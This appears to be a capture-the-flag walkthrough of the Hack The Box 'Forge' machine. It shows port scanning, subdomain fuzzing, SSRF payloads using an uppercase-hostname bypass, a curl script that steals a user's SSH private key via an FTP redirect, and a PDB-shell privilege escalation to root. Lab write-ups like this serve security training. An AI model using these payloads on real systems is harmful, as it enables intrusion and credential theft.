# [Forge](https://app.hackthebox.com/machines/forge)


```bash
nmap -p- --min-rate 10000 10.10.11.111 -Pn
```
![Alt text](img/image.png)


After seeing this result, we see that (21,22,80) ports are open.
Let's do greater nmap scan.


```bash
nmap -A -sC -sV -p21,22,80 10.10.11.111 -Pn
```

![Alt text](img/image-1.png)



After these results, we add this ip address to our '/etc/hosts' file for resolving purposes.

```bash
10.10.11.111 forge.htb
```

Let's do Subdomain enumeration that we can find or not.

```bash
wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.10.11.111 -H "Host: FUZZ.forge.htb" --sc 200
```

![Alt text](img/image-2.png)

We find 'admin.forge.htb' subdomain, let's enumerate this.

![Alt text](img/image-3.png)


It says, this webpage is only accessible via only local network.

Let's enumerate http port of this target.

There's '/**upload**' endpoint which we can upload images via browsing or URL.

![Alt text](img/image-4.png)


Let's enumerate including URLs for uploading.  (SSRF vulnerability)

```bash
http://admin.forge.htb  #it doesn't work
http://ADMIN.FORGE.HTB  #it's small bypass way.
```

![Alt text](img/image-5.png)


We can browse this image also.

![Alt text](img/image-6.png)


From curl, we see that we can browse Admin panel which can only be accessible via `localhost`

Another SSRF payload

```bash
http://ADMIN.FORGE.HTB/announcements
```

![Alt text](img/image-7.png)


Let's browse what we see.

![Alt text](img/image-8.png)


Here's what we can see FTP credentials here, let's grab them.

user:heightofsecurity123!



Also from browsing results, we can see there is also `redirect` possible (via u parameter), we can embed link here to browsing.

Let's add FTP url into here.

```bash
http://ADMIN.FORGE.HTB/u?=ftp://user:heightofsecurity123!@127.0.0.1
```

![Alt text](img/image-9.png)


Now, it's time to get id_rsa of user.

I do this via below mini Bash script.

```bash
RESULT=`curl --location --request POST 'http://forge.htb/upload' --form 'url="http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@ADMIN.FORGE.HTB/.ssh/id_rsa"' --form 'remote="1"' 2>/dev/null | grep -Eo 'http://[^ ">]+' | head -1` && echo $RESULT && curl $RESULT
```

![Alt text](img/image-10.png)


Let's save this id_rsa key into file, give 600 privileges then login.

user.txt

![Alt text](img/image-11.png)


Once we are inside, let's try to escalate our privileges into 'root' user. For this type `sudo -l` command to Terminal.

![Alt text](img/image-12.png)


Script which have sudo privilegs is below.

![Alt text](img/image-13.png)


From here, we grab 'password' = secretadminpassword


Let's run this application.

![Alt text](img/image-14.png)

It wants joining from local.

![Alt text](img/image-15.png)



After reading source code, we see that if we enter random data into here, it opens `PDB` shell for us.

![Alt text](img/image-16.png)

If we have `PDB` shell, we can be root user via below commands.

```bash
import os
os.system("bash")
```

![Alt text](img/image-17.png)


root.txt

![Alt text](img/image-18.png)